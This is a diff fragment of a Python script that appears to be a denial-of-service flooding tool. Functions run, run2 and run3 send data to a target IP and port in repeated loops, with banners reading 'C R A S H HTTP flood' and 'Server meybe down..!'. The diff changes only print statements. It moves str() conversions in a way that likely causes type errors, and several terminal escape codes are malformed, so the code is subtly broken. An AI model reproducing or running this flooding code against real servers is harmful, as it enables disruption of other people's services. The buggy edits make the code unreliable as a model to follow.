@@ -57,8 +57,8 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i *" \036[4mC R A S H  \033[37mHTTP flood  \033[35m" +(ip)+ " \033[32m" +str(data)+ "")
-			print(i *" \036[33mC R A S H  \033[37mHTTP flood  \033[4m" +(ip)+ " \033[37m" +str(times)+ "")
+			print(i *" \036[4mC R A S H  \033[37mHTTP flood  \033[35m" +str(ip)+ " \033[32m" +(data)+ "")
+			print(i *" \036[33mC R A S H  \033[37mHTTP flood  \033[4m" +str(ip)+ " \033[37m" +(times)+ "")
 		except:
 			print(i *" \036[33mC R A S H  \033[37mHTTP flood  \033[4m" +(ip)+ " \033[30mServer meybe down..!\033[0m")
 				
@@ -72,8 +72,8 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i *" \036[4mC R A S H  \033[37mHTTP flood  \033[35m" +(ip)+ " \033[32m" +str(data)+ "")
-			print(i *" \036[33mC R A S H  \033[37mHTTP flood  \033[4m" +(ip)+ " \033[37m" +str(times)+ "")
+			print(i *" \036[4mC R A S H  \033[37mHTTP flood  \033[35m" +str(ip)+ " \033[32m" +(data)+ "")
+			print(i *" \036[33mC R A S H  \033[37mHTTP flood  \033[4m" +str(ip)+ " \033[37m" +(times)+ "")
 		except:
 			s.close()
 			print(i *" \036[33mC R A S H  \033[37mHTTP flood  \033[4m" +(ip)+ " \033[30mServer meybe down..!")
@@ -89,8 +89,8 @@ def run3():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i *" \036[4mC R A S H  \033[37mHTTP flood  \033[35m" +(ip)+ " \033[32m" +str(data)+ "")
-			print(i *" \036[33mC R A S H  \033[37mHTTP flood  \033[4m" +(ip)+ " \033[37m" +str(times)+ "")
+			print(i *" \036[4mC R A S H  \033[37mHTTP flood  \033[35m" +str(ip)+ " \033[32m" +(data)+ "")
+			print(i *" \036[33mC R A S H  \033[37mHTTP flood  \033[4m" +str(ip)+ " \033[37m" +(times)+ "")
 		except:
 			s.close()
 			print(i *" \036[33mC R A S H  \033[37mHTTP flood  \033[4m" +(ip)+ " \033[30mServer meybe down..!\033[0m")
